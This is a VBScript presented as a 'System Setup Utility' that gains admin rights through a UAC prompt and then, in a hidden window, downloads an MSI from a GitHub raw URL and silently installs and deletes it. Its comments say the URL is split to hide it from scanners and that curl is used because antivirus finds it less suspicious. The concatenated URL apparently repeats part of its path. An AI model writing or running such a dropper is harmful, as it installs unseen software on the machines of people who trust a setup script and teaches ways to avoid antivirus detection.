' ==========================================
' System Setup Utility
' ==========================================
Set objShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' 1. Check for Admin Rights
On Error Resume Next
isAdmin = False
testFile = "C:\Windows\system32\__admin_check.tmp"
objFSO.CreateTextFile(testFile, True)
If objFSO.FileExists(testFile) Then
    objFSO.DeleteFile(testFile)
    isAdmin = True
End If

' 2. If not Admin, request UAC elevation
If Not isAdmin Then
    ' This line triggers the UAC prompt (Yes/No)
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End If

' 3. Setup Variables (Split URL to hide from simple scanners)
u_part1 = "https://github.com/sample1909-hash/my-installers/raw/refs/heads/main/Installer.msi"
u_part2 = "raw/refs/heads/main/Installer.msi"
fullUrl = u_part1 & u_part2
tempMsi = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\sys_update.msi"

' 4. Execute Download and Install (Totally Hidden)
' We use 'curl' because it is a signed Microsoft tool included in Win 10/11
' It is much less suspicious to Antivirus than PowerShell download commands.
cmd = "cmd /c curl -L -s " & fullUrl & " -o " & tempMsi & " && msiexec /i " & tempMsi & " /qn /norestart && del " & tempMsi

' 0 = Hidden Window, True = Wait for it to finish
WshShell.Run cmd, 0, True
